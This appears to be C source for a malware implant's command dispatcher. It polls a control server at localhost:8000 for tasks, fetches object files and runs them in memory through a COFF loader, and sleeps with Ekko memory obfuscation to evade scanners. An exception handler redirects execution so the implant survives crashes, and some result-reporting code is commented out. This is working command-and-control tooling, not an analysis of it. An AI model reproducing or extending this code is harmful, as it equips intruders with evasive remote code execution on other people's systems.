#include <CommandDispatcher.h>

FUNC int custom_isspace(char c)
{
    // Check if the character is one of the standard whitespace characters
    if (c == ' ' || c == '\t' || c == '\n' || c == '\v' || c == '\f' || c == '\r')
    {
        return 1; // It's a whitespace character
    }
    return 0; // It's not a whitespace character
}

FUNC long custom_strtol(const char *str, char **endptr, int base)
{
    const char *p = str;
    long result = 0;
    int negative = 0;

    // Skip leading whitespace
    while (custom_isspace(*p))
    {
        p++;
    }

    // Check for optional sign
    if (*p == '-')
    {
        negative = 1;
        p++;
    }
    else if (*p == '+')
    {
        p++;
    }

    // Check for base prefix (0x for hex, 0 for octal)
    if (base == 0)
    {
        if (*p == '0')
        {
            if (*(p + 1) == 'x' || *(p + 1) == 'X')
            {
                base = 16;
                p += 2;
            }
            else
            {
                base = 8;
                p++;
            }
        }
        else
        {
            base = 10;
        }
    }
    else if (base == 16 && *p == '0' && (*(p + 1) == 'x' || *(p + 1) == 'X'))
    {
        p += 2;
    }

    // Convert the string to a long integer
    while (*p)
    {
        int digit;
        if (*p >= '0' && *p <= '9')
        {
            digit = *p - '0';
        }
        else if (*p >= 'a' && *p <= 'z')
        {
            digit = *p - 'a' + 10;
        }
        else if (*p >= 'A' && *p <= 'Z')
        {
            digit = *p - 'A' + 10;
        }
        else
        {
            break; // Non-numeric character found
        }

        if (digit >= base)
        {
            break; // Digit is invalid for the current base
        }

        // Check for overflow
        if (result > (LONG_MAX - digit) / base)
        {
            result = negative ? LONG_MIN : LONG_MAX;
            if (endptr)
            {
                *endptr = (char *)p;
            }
            return result;
        }

        result = result * base + digit;
        p++;
    }

    // Apply the sign
    if (negative)
    {
        result = -result;
    }

    // Set endptr to the first invalid character if provided
    if (endptr)
    {
        *endptr = (char *)p;
    }

    return result;
}

FUNC unsigned char *unhexlify(unsigned char *value, int *outlen)
{
    STARDUST_INSTANCE

    unsigned char *retval = NULL;
    char byteval[3] = {0};
    unsigned int counter = 0;
    int counter2 = 0;
    char character = 0;
    if (value == NULL)
    {
        return NULL;
    }
    if (StringLengthA((char *)value) % 2 != 0)
    {
        goto errcase;
    }

    retval = Instance()->Win32.calloc(StringLengthA(value) + 1, 1);
    if (retval == NULL)
    {
        goto errcase;
    }

    counter2 = 0;
    for (counter = 0; counter < StringLengthA((char *)value); counter += 2)
    {
        MmCopy(byteval, value + counter, 2);
        character = (char)Instance()->Win32.strtol(byteval, NULL, 16);
        MmCopy(retval + counter2, &character, 1);
        counter2++;
    }
    *outlen = counter2;

errcase:
    return retval;
}

FUNC LONG COFFExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    STARDUST_INSTANCE
    char StringBuf[256];

    // Format the error message into StringBuf
    Instance()->Win32.sprintf(StringBuf, "Error with code: 0x%x", ExceptionInfo->ExceptionRecord->ExceptionCode);
    // Print the error message
    Instance()->Win32.printf(StringBuf);

    // Optionally modify Rip if necessary
    if (Instance()->CoffReturn)
    {
        ExceptionInfo->ContextRecord->Rip = (DWORD64)(ULONG_PTR)Instance()->CoffReturn;
    }

    return EXCEPTION_CONTINUE_EXECUTION; // Return to continue execution
}

FUNC void CommandDispatch(PBUFFER AgentId)
{
    STARDUST_INSTANCE
    Instance()->Win32.RtlAddVectoredExceptionHandler(TRUE, (PVOID)COFFExceptionHandler);

    // Fetch the task
    BUFFER task = SendRequest(L"http://localhost:8000/agent", L"GET", NULL);

    Instance()->Win32.printf("%d ", task.Length);

    if (task.Length > 0)
    {
        UINT32 Len = 0;
        PCHAR Id = ParserGetTaskID(&task);    // Get task ID
        INT TaskType = ParserGetInt32(&task); // Get task type
        Instance()->CurrentTaskID = Id;

        Instance()->Win32.printf("%s %d ", Id, TaskType);

        PCHAR data = NULL;
        if (TaskType == 1) // TaskType 1: File-related task
        {
            PCHAR FileId = ParserGetBytes(&task, &Len); // Get File ID

            // Fetch the file using the File ID and Task ID
            BUFFER File = FileFetch(FileId, Id);

            SIZE_T ArgsLen = 0;
            PCHAR CoffArgs = NULL;
            PCHAR Unhexlified = NULL;

            // if (task.Length > 0)
            // {

            //     // Get argument length
            //     // Instance()->Win32.printf("%d", task.Length);
            //     CoffArgs = ParserGetBytes(&task, &Len);
            //     Unhexlified = unhexlify(CoffArgs, (PVOID)&ArgsLen);

            //     // ArgsLen = ParserGetInt32(&task);

            //     //     // if (ArgsLen > 4)
            //     //     // {
            //     //     //     CoffArgs = ParserGetBytes(&task, &Len);
            //     //     // }
            // }

            // // Call CoffeeLdr with the correct arguments
            CoffeeLdr("go", File.Buffer, "", 0);
            // //"0900000003000000433a000000"
            // // PUCHAR args = CoffArgs;
            // // PUCHAR args = "0900000003000000433a000000";
            // // SIZE_T size = StringLengthA(args);
            // // SIZE_T outlen = 0;
            // // LPSTR arg2 = unhexlify(args, (PVOID)&outlen);
            // // CoffeeLdr("go", File.Buffer, arg2, 13);
            // CoffeeLdr("go", File.Buffer, Unhexlified, ArgsLen);

            // Get the output data from the operation
            // data = BeaconGetOutputData(0);

            // // Send the response back to the server
            // if (!data)
            //     Response(Id, NULL, TRUE, L"http://localhost:8000/result");
            // else
            //     Response(Id, data, FALSE, L"http://localhost:8000/result");
        }
        else if (TaskType == 2)
        {
            Instance()->Win32.printf("SLEEEP");
            INT Res = ParserGetInt32(&task); // Get sleep duration
            EkkoEx(Res, SLEEPOBF_BYPASS);    // Perform sleep with obfuscation bypass
            Response(Id, NULL, FALSE, L"http://localhost:8000/result");
        }
        else if (TaskType == 3)
        {
            return; // Exit the loop
        }
    }

    // Sleep for 1 second before fetching the next command
    EkkoEx(1000, SLEEPOBF_BYPASS);
    CommandDispatch(AgentId);
}
